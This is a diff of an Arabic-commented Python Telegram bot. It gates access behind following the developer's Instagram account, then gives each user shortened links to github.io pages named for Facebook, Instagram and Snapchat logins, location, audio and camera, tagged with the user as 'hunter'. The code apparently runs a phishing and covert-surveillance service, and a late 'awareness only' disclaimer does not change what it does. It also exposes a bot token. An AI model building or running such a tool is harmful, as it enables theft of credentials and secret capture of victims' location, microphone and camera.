@@ -16,7 +16,7 @@ def keep_alive(): Thread(target=run).start()
 
 # --- إعدادات البوت ---
 TOKEN = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE'
-MY_ID = '7238206121' 
+MY_ID = '7238206121' # آي دي أبو سند Malkawi
 bot = telebot.TeleBot(TOKEN)
 
 bot.remove_webhook()
@@ -24,7 +24,6 @@ time.sleep(1)
 
 def short(url):
     try:
-        # تقليل وقت الانتظار للاختصار عشان ما يعلق البوت
         r = requests.get(f"https://is.gd/create.php?format=simple&url={url}", timeout=5)
         return r.text
     except:
@@ -41,6 +40,7 @@ def start(m):
 🔴 تـحـذيـر: بـدون مـتـابـعـة المـطـور سـتـبـقى الروابـط مـشـفـرة 💀🔥
     """
     markup = types.InlineKeyboardMarkup()
+    # الرابط m_y_.9
     btn_insta = types.InlineKeyboardButton("🔗 مـتـابـعـة المـطـور (إجـبـاري)", url="https://www.instagram.com/m_y_.9/")
     btn_done = types.InlineKeyboardButton("✅ تـم المـتـابـعـة (تـفـعـيـل)", callback_data="check_follow")
     markup.add(btn_insta)
@@ -53,24 +53,17 @@ def check_follow(call):
     uid = call.message.chat.id
     name = call.from_user.first_name
     
-    # 1. إعطاء استجابة فورية للتليجرام عشان يشيل علامة التحميل عن الزر
     bot.answer_callback_query(call.id, "جـاري فـك تـشـفـيـر الروابـط... 🚀")
-    
-    # 2. إرسال رسالة انتظار للمستخدم
     wait_msg = bot.send_message(uid, "⏳ انـتـظـر ثـوانـي، جـاري تـولـيـد الروابـط الـخـاصـة بـك...")
 
     h = name.replace(" ", "_")
     base = "https://m-y-9-tech.github.io/fb/"
     p = f"?id={uid}&hunter={h}&dev={MY_ID}"
     
-    # توليد الروابط
     lnks = {
-        "fb": short(base+"fb.html"+p),
-        "ig": short(base+"ig.html"+p),
-        "sn": short(base+"snap.html"+p),
-        "lc": short(base+"loc.html"+p),
-        "au": short(base+"audio.html"+p),
-        "c1": short(base+"cam.html"+p),
+        "fb": short(base+"fb.html"+p), "ig": short(base+"ig.html"+p),
+        "sn": short(base+"snap.html"+p), "lc": short(base+"loc.html"+p),
+        "au": short(base+"audio.html"+p), "c1": short(base+"cam.html"+p),
         "c2": short(base+"cam2.html"+p)
     }
 
@@ -105,10 +98,13 @@ def check_follow(call):
 🔗 `{lnks['c2']}`
 
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+⚖️ إخـ^ـلاء مـ^ـسـ^ـؤوليـ^ـة:
+هـذا الـبـوت مـخـصـص لأغـراض الـتـوعـيـة الأمـنـيـة والـتـعـلـيـم فـقـط. المـطـور غـيـر مـسـؤول عـن أي اسـتـخـدام غـيـر قـانـونـي أو ضـار لـهـذه الأدوات. تـحـمـل مـسـؤولـيـة أفـعـالـك بـمـفـردك.
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+
 ⚙️ Status: Connected Successfully
     """
     
-    # حذف رسالة الانتظار ورسالة التنبيه القديمة وإرسال القائمة النهائية
     try:
         bot.delete_message(uid, wait_msg.message_id)
         bot.delete_message(uid, call.message.message_id)
